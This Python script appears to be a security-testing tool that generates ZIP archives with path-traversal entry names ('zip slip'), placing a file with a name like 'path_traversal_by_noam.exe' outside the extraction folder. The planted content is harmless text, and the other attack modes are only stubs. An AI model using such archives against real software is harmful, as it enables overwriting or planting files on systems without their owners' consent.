# main.py

import argparse
import os
import zipfile
import shutil
import sys
from validators import InputValidator

# `traversal_depth` function determines how many path traversal paths are traversed
def get_traversal_depth():
    if default_mode:
        depth = default_config["pt"]["traversal_depth"]
        if InputValidator.is_int(depth) == False:
            raise SystemExit("Please check the default config file, seems to be an error under path traversal settings.\
                Path traversal depth must be a positive integer")
    else:
        while True:
            depth = input("Enter number of path traversal steps (depth) you would like to test: ").strip()
            try:
                depth = int(depth)
                break
            except:
                print("Invalid. Depth must be a positive Integer.")
    
    return depth

def get_file_name():
    if default_mode:
        file_name = default_config["pt"]["file_name"]
    else:
        while True:
            file_name = input("Enter file to be saved as a malicious path traversal (e.g. `hello.txt`): ").strip()
            
            if InputValidator.is_non_empty_string(file_name) == False:
                print("File name can't be an empty string.")
            else:
                break
        
    return file_name

def create_path_traversal(path):
    traversal_depth = get_traversal_depth()
    
    if operating_system == "w":
        path_traversal_dir = ("..\\" * traversal_depth)
    else:
        path_traversal_dir = ("../" * traversal_depth)
        
    path_traversal_dir += path + get_file_name()
    
    zip_file = "Archive.zip"
    
    while True:
        zip_location = input("If you want to add the file to an existing ZIP, please enter it's location, "
            "or Press Enter to create a new zip: ").strip()
        
        if zip_location:
            if os.path.exists(zip_location) and zipfile.is_zipfile(zip_location):
                # Create a copy of the ZIP that the user gave
                shutil.copy(zip_location, zip_file)
                break
            else:
                print("Invalid location, zip not found.")
        else:
            break
    
    with zipfile.ZipFile(zip_file, 'a') as zipf:
        content = "If you see me, this might me a bad sign..."
        temp_file = "tmp.txt"
        with open(temp_file, "w") as f:
            f.write(content)
        
        # Add them to the ZIP with custom names
        zipf.write(temp_file, arcname=path_traversal_dir)
        os.remove(temp_file)
    
    print(f"New ZIP file created named {zip_file} with `{path_traversal_dir}` as a malicious file.")

def main():
    global operating_system, default_mode
    try:
        # Initialize the argument parser
        parser = argparse.ArgumentParser(
            description="A script that accepts a 'type' argument, an optional 'operating system' argument, and a 'default' mode."
        )
        
        # Add the 'type' argument (mandatory)
        parser.add_argument(
            "-t", "--type",
            choices=["pt", "fns", "sym", "dos"],
            help="Specify the type of vulnerability: pt (path traversal), fns (file name spoofing), sym (symlink), dos (Denial of Service). Default is Path Traversal"
        )
        
        # Add the 'operating system' argument (optional)
        parser.add_argument(
            "-os", "--operating-system",
            choices=["w", "l", "u"],
            default=default_config["operating_system"],
            help="Specify the operating system: w (windows), l (linux), or u (unix). Default is linux"
        )
        
        # Add the 'path' argument (optional)
        parser.add_argument(
            "-p", "--path",
            default=default_config["pt"]["path"][default_config["operating_system"]],
            help="Path to include in file name after traversal. e.g. `etc/`. For an empty path, add the argument with an empty double quote - \"\""
        )
        
        # Add the 'default' argument (optional, no data required)
        parser.add_argument(
            "-D", "--default",
            action="store_true",
            help="Enable default mode (no additional data required)."
        )
        
        # Parse the arguments
        args = parser.parse_args()
        
        # Determine if default mode is enabled
        default_mode = args.default
        
        # Output the results
        allowed_operating_systems = ["w", "l", "u"]
        operating_system = args.operating_system
        if operating_system not in allowed_operating_systems:
            print(f"Invalid operating system. Supported operating systems are: {', '.join(allowed_operating_systems)}")
            exit(1)
        
        match args.type:
            case "pt":
                create_path_traversal(args.path)
            case "fns":
                print("File name Spoofing selected")
            case "sym":
                print("Symlink selected")
            case "dos":
                print("Denial of Service selected")
            case _:
                create_path_traversal(args.path)
    except KeyboardInterrupt:
        print("\nOperation cancelled by the user. Exiting gracefully...")
        sys.exit(0)

# TODO: Load default settings from config file
default_config = {
    "operating_system": "l",
    "pt": {
        "traversal_depth": 7,
        "file_name": "path_traversal_by_noam.exe",
        "path": {
            "l": "tmp/",
            "w": "Windows\\",
            "u": "tmp/"
        }
    }
}

default_mode = False
        
if __name__ == "__main__":
    main()